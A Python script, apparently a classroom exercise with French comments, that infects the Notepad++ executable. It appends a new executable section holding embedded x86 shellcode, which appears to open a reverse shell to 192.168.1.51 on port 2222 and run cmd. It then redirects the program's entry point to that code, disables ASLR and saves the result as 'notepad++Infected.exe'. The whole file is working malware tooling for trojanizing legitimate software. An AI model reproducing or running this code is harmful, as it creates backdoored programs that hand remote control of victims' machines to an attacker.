import pefile
import os




shellcode = bytes  (b"\x60\x9c\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
                    b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
                    b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
                    b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
                    b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
                    b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
                    b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
                    b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
                    b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
                    b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
                    b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
                    b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
                    b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
                    b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
                    b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x01\x33\x68"
                    b"\x02\x00\x08\xae\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
                    b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
                    b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
                    b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
                    b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
                    b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
                    b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x90\x56\x46\xff\x30"
                    b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
                    b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
                    b"\x75\x05\xbb\x47\x13\x72\x6F\x6A\x00\x53\x81\xC4\x00\x02\x00\x00\x9D\x61\xE9\x45\xED\xF5\xFF")




def adjust_SectionSize(size, align):
    if size % align:
        size = ((size + align) // align) * align
    return size

def addInSectionsTab(pe,new_section,new_section_data):
    pe.sections.append(new_section)
    pe.__structures__.append(new_section)
    pe.__data__ = bytearray(pe.__data__) + new_section_data
    pe.write('notepad++Infected.exe')
    print(new_section)

def updateOEP(pe,new_section,new_section_data):
    print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage += adjust_SectionSize(0x1000, pe.OPTIONAL_HEADER.SectionAlignment)

    addInSectionsTab(pe,new_section,new_section_data)

def addShellcodeIntoSection(pe,pad,new_section):
    new_section_data = bytearray(pad + new_section.SizeOfRawData)
    new_section_data[pad:350] = shellcode

    updateOEP(pe,new_section,new_section_data)

def resize_exe(pe,path,new_section,last_section):

    # Need the diff between lastSection and EOF to get the size of the garbage
    # On obtient la taile de l'exe
    original_size = os.path.getsize(path)
    # On fait la différence entre la taille original et les données qu'on a rajouter sur le disque
    diff = original_size - (last_section.PointerToRawData +last_section.SizeOfRawData)
    # Add GarbageSize + lastSection to get next valid PointerToRawData
    NewPointerToRawData = adjust_SectionSize((diff + last_section.PointerToRawData +last_section.SizeOfRawData), pe.OPTIONAL_HEADER.SectionAlignment)
    new_section.PointerToRawData = NewPointerToRawData
    # Padding between EOF and next section
    pad = NewPointerToRawData - original_size

    addShellcodeIntoSection(pe,pad,new_section)

def initialization_HeaderSection(pe,new_section,last_section):
    #Le nom du header de la section
    new_section.Name = b'.ESGI'
    # On ajoute 4096 octets à la taille de la section sur le disque en alignant avec FileAlignment
    new_section.SizeOfRawData = adjust_SectionSize(
        0x1000, pe.OPTIONAL_HEADER.FileAlignment)
    # La taille virtuelle de la section
    new_section.Misc_VirtualSize = 0x1000
    #Marche sans : new_section.Misc = 0x1000
    #Marche sans : new_section.Misc_PhysicalAddress = 0x1000
    # On aligne l'adresse Virtuelle avec la Section Alignment -> Obligatoire
    new_section.VirtualAddress = last_section.VirtualAddress + adjust_SectionSize(last_section.Misc_VirtualSize,pe.OPTIONAL_HEADER.SectionAlignment)
    # Characteristics : On met les flags suivants : droit en Lecture / Ecriture /  Execution / Section contient du code
    new_section.Characteristics = 0xE0000020
    # Désactivation ASLR
    pe.OPTIONAL_HEADER.DllCharacteristics -= 0x40

    resize_exe(pe,path,new_section,last_section)

def creation_HeaderSection(pe):
    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
    number_sections = pe.FILE_HEADER.NumberOfSections - 1
    last_section = pe.sections[number_sections]
    new_section.__unpack__(bytearray(new_section.sizeof()))
    new_section.set_file_offset(
    pe.sections[number_sections].get_file_offset() + 40)

    initialization_HeaderSection(pe,new_section,last_section)

def main(path):
    pe = pefile.PE(path)


    creation_HeaderSection(pe)

#print('Entrer le path de l\'.exe :')
#path = input()
path = "Notepad++/notepad++.exe"
main(path)

















